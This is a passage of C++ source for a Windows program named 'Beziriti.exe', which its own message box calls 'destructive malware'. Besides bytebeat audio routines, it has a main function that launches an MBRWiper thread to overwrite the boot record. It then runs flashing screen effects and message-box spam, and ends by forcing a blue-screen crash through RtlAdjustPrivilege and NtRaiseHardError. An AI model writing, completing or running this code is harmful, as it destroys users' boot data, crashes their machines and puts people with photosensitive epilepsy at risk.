    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & (t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8) & t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8) & t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * (1 - (t + 10 >> (t >> 9 & t >> 14) & t >> 4 & -2)) * ((t >> 10 ^ t + (t >> 6 & 127) >> 10) & 1) * 32 + 12);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    Sleep(30000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main() {
    if (MessageBoxW(NULL, L"This is a destructive malware, run?", L"Beziriti.exe by VietNamLover", 
                    MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    
    if (MessageBoxW(NULL, L"Are you sure? It will still move your mouse, spam MessageBoxes, contains flashing lights and it not for epilepsy! ", 
                    L"Beziriti.exe - lAsT wARniNg", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
            CreateThread(0, 0, MBRWiper, 0, 0, 0);
            Sleep(1000);
            HANDLE thread0 = CreateThread(0, 0, msgbox, 0, 0, 0);
            Sleep(5000);
            TerminateThread(thread0, 0);
            CloseHandle(thread0);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread2 = CreateThread(0, 0, melt, 0, 0, 0);
            sound2();
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread3 = CreateThread(0, 0, melt2, 0, 0, 0);
            HANDLE thread3dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
            sound3();
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread4 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound4();
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, sines1, 0, 0, 0);
            sound5();
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread6 = CreateThread(0, 0, blur1, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
            sound6();
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread7 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound7();
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread8 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound8();
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            TerminateThread(thread3dot1, 0);
            CloseHandle(thread3dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread9 = CreateThread(0, 0, shader6, 0, 0, 0);
            HANDLE thread9dot1 = CreateThread(0, 0, icons, 0, 0, 0);
            sound9();
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            TerminateThread(thread9dot1, 0);
            CloseHandle(thread9dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread10 = CreateThread(0, 0, shader7, 0, 0, 0);
            sound10();
            TerminateThread(thread10, 0);
            CloseHandle(thread10);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread11 = CreateThread(0, 0, blur2, 0, 0, 0);
            HANDLE thread11dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
            sound11();
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread12 = CreateThread(0, 0, gdi1, 0, 0, 0);
            sound12();
            TerminateThread(thread12, 0);
            CloseHandle(thread12);
            TerminateThread(thread11dot1, 0);
            CloseHandle(thread11dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread13 = CreateThread(0, 0, shader8, 0, 0, 0);
            sound13();
            TerminateThread(thread13, 0);
            CloseHandle(thread13);
            InvalidateRect(0, 0, 0);

            HANDLE thread14 = CreateThread(0, 0, shader9, 0, 0, 0);
            HANDLE thread14dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
            sound14();
            InvalidateRect(0, 0, 0);
            
            HANDLE thread15 = CreateThread(0, 0, gradient1, 0, 0, 0);
            sound15();
            TerminateThread(thread14, 0);
            CloseHandle(thread14);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread16 = CreateThread(0, 0, radialRGB, 0, 0, 0);
            sound16();
            TerminateThread(thread15, 0);
            CloseHandle(thread15);
            TerminateThread(thread16, 0);
            CloseHandle(thread16);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread17 = CreateThread(0, 0, shader10, 0, 0, 0);
            HANDLE thread17dot1 = CreateThread(0, 0, icons2, 0, 0, 0);
            sound17();
            TerminateThread(thread17, 0);
            CloseHandle(thread17);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread18 = CreateThread(0, 0, shader11, 0, 0, 0);
            sound18();
            TerminateThread(thread18, 0);
            CloseHandle(thread18);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread19 = CreateThread(0, 0, shader12, 0, 0, 0);
            sound19();
            TerminateThread(thread14dot1, 0);
            CloseHandle(thread14dot1);
            TerminateThread(thread17dot1, 0);
            CloseHandle(thread17dot1);
            TerminateThread(thread19, 0);
            CloseHandle(thread19);
            InvalidateRect(0, 0, 0);
            
            Sleep(1000);
            HANDLE thread01 = CreateThread(0, 0, msgbox1, 0, 0, 0);
            Sleep(5000);
            TerminateThread(thread01, 0);
            CloseHandle(thread01);
            
            HANDLE thread20 = CreateThread(0, 0, MsgSpamThread, 0, 0, 0);
            HANDLE thread20dot1 = CreateThread(0, 0, shader13, 0, 0, 0);
            sound20();
            TerminateThread(thread20, 0);
            CloseHandle(thread20);
            TerminateThread(thread20dot1, 0);
            CloseHandle(thread20dot1);
            InvalidateRect(0, 0, 0);

			// BSOD Trigger (Final blow)
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);

            HANDLE finale = CreateThread(0, 0, last, 0, 0, 0);
            WaitForSingleObject(finale, INFINITE);
            CloseHandle(finale);
    Sleep(-1);
}